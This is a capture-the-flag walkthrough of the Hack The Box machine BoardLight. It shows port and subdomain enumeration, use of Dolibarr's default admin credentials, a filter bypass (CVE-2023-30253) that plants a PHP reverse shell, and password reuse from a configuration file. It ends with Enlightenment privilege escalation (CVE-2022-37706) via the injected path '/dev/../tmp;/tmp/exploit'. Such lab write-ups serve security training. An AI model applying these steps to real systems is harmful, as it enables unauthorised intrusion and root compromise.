# HTB – BoardLight
### TL;DR
This is an Ubuntu 20.04 machine running a version of Dolibarr which is vulnerable to PHP injection (CVE-2023-30253). This is exploited to get an initial foothold as user `www-data`, then we find a credential to move laterally to a low-privileged user and retrieve the user flag. Regarding escalation, we abuse a vulnerable installed Enlightenment version (CVE-2022-37706).
### KEYWORDS
Dolibarr, CVE-2023-30253, PHP injection, SUID, Enlightenment, CVE-2022-37706.
### REFERENCES
https://www.dolibarr.org/forum/t/login-after-installation/16088<br>
https://www.cvedetails.com/cve/CVE-2023-30253<br>
https://www.cvedetails.com/cve/CVE-2022-37706<br>
https://www.exploit-db.com/exploits/51180<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-30 07:23 EDT
Nmap scan report for 10.10.11.11
Host is up, received user-set (0.037s latency).
Not shown: 63419 closed tcp ports (conn-refused), 2114 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv -n
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-30 07:37 EDT
Nmap scan report for 10.10.11.11
Host is up, received user-set (0.038s latency).
Scanned at 2024-08-30 07:37:19 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 062d3b851059ff7366277f0eae03eaf4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 5903dc52873a359934447433783135fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab1338e43ee024b46938a9638238ddf4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
```
Enumerate the web site with Firefox, take note of the domain name.

![Untitled](https://github.com/user-attachments/assets/349c145b-41dc-44f8-ab10-606cd6144328)

Add to hosts file and fuzz for subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404 -fs 15949 -t 100 -u http://board.htb -H "Host: FUZZ.board.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 69ms]
:: Progress: [4989/4989] :: Job [1/1] :: 455 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```
Add the found subdomain to hosts file and enumerate with Firefox.

![Untitled8](https://github.com/user-attachments/assets/841ecda5-beb6-4700-ad14-3ce08fa785ad)

A Dolibarr welcome page pops-up. This is an open source ERP and CRM for enterprises. The running version is 17.0.0.

### USER
We find Dolibarr default credentials doing an online search (https://www.dolibarr.org/forum/t/login-after-installation/16088). Log in as `admin:admin`, and navigate to the "Websites" section, where you can create and publish sites. This feature is vulnerable to PHP injection allowing filters to be bypassed. More info here: https://www.cvedetails.com/cve/CVE-2023-30253<br>
<br>
Click on "Websites" tab and then in "Add". Enter any name nad click on "Create".

![Untitled6](https://github.com/user-attachments/assets/92fdc1d5-e72c-4f63-abf5-a150068a56c4)

Next, add a new page, select "New page from scratch", enter any title and click on "Create".

![Untitled7](https://github.com/user-attachments/assets/060c3dc4-07e8-4a4d-93ef-f55ba0da3d22)

Now we edit the page HTML source adding PHP code to send a reverse shell. This is normally blocked by the application, but the filter can be bypassed as indicated in the CVE details. Make sure "Show dynamic content" and "Edit inline" are activated so the PHP code is rendered after saving.

![Untitled7770](https://github.com/user-attachments/assets/f5db7efa-f660-4adf-b89f-ce2b4381cf69)

Add a PHP reverse shell, the filter is bypassed by replacing `<?php` with `<?PHP` as indicated in the aforementioned CVE.

![Untitle107](https://github.com/user-attachments/assets/7493a839-81b9-4186-b831-6827c18fb145)

Click on "Save", a reverse shell for user `www-data` is received on port 1919.

![Untitled8](https://github.com/user-attachments/assets/fd6b55d7-de14-4c7f-b244-01d5c91b11af)

Shells for user `www-data` are limited; however, this user is usually allowed to read the `/var/www/html` directory, where we can harvest passwords.
```markdown
> find /var -name *.php 2> /dev/null | grep conf 
/var/www/html/crm.board.htb/htdocs/public/project/suggestconference.php
/var/www/html/crm.board.htb/htdocs/includes/tecnickcom/tcpdf/tcpdf_autoconfig.php
/var/www/html/crm.board.htb/htdocs/includes/tecnickcom/tcpdf/config/tcpdf_config.php
/var/www/html/crm.board.htb/htdocs/includes/webklex/php-imap/src/config/imap.php
/var/www/html/crm.board.htb/htdocs/includes/swiftmailer/lib/swiftmailer_generate_mimes_config.php
/var/www/html/crm.board.htb/htdocs/stripe/config.php
/var/www/html/crm.board.htb/htdocs/core/filemanagerdol/connectors/php/config.inc.php
/var/www/html/crm.board.htb/htdocs/core/class/conf.class.php
/var/www/html/crm.board.htb/htdocs/install/fileconf.php
/var/www/html/crm.board.htb/htdocs/admin/eventorganization_confbooth_extrafields.php
/var/www/html/crm.board.htb/htdocs/admin/eventorganization_confboothattendee_extrafields.php
/var/www/html/crm.board.htb/htdocs/conf/conf.php
/var/www/html/crm.board.htb/htdocs/eventorganization/lib/eventorganization_conferenceorbooth.lib.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_card.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_note.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_contact.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_card.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_list.php
/var/www/html/crm.board.htb/htdocs/eventorganization/class/conferenceorbooth.class.php
/var/www/html/crm.board.htb/htdocs/eventorganization/class/conferenceorboothattendee.class.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorbooth_document.php
/var/www/html/crm.board.htb/htdocs/eventorganization/conferenceorboothattendee_list.php
```
In the file `/var/www/html/crm.board.htb/htdocs/conf/conf.php` there are credentials for the MySQL database.
```markdown
> cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```
Maybe someone is reusing this password for his user account. Let's dump the host usernames.
```markdown
> cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
And verify we can use the password to open an SSH shell for as `larissa`

![Untitled8](https://github.com/user-attachments/assets/bc588ca9-2344-4df3-b4ab-a1e0f17d5df9)

Which can be used to retrieve the user flag.

### ROOT
Start from the SSH session as `larissa` and take the opportunity to enumerate the user and the system.
```markdown
> whoami && id
larissa
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)

> cat /etc/os-release && uname -a
Linux boardlight 5.15.0-107-generic #117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
Enumerate SUID files.
```markdown
> find / -perm -u=s -type f 2>/dev/null | xargs ls -hal
-rwsr-xr-x 1 root root        84K Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root        52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root        39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root        87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        55K Apr  9 08:34 /usr/bin/mount
-rwsr-xr-x 1 root root        44K Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root        67K Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root        67K Apr  9 08:34 /usr/bin/su
-rwsr-xr-x 1 root root       163K Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root        39K Apr  9 08:34 /usr/bin/umount
-rwsr-xr-x 1 root root        15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-- 1 root messagebus  51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
-rwsr-xr-x 1 root root        15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
-rwsr-xr-x 1 root root        15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
-rwsr-xr-x 1 root root        27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
-rwsr-sr-x 1 root root        15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip        386K Jul 23  2020 /usr/sbin/pppd
```
The Enlightenment binaries belongs to a window manager application, which seems to be vulnerable (https://www.cvedetails.com/cve/CVE-2022-37706).<br>
<br>
According to the CVE description, the the system library function mishandles pathnames that begin with a `/dev/..` substring. There is an exploit available at https://www.exploit-db.com/exploits/51180 that you can execute it for instant root shell.<br>
<br>
Or just try to understand what it does and run it manually. Basically, the vulnerable binary fails to handle a source file when the path begins with `/dev/..` substring. So if we inject a path called `/dev/../tmp;/tmp/exploit`, the application will fail to process the first part, and will just run the second part. We just need to make this second part is a malicious payload to spawn a shell.

![Untitled9](https://github.com/user-attachments/assets/0538037e-a4f5-4a60-80c8-bdf3f2c9967d)

You are root.
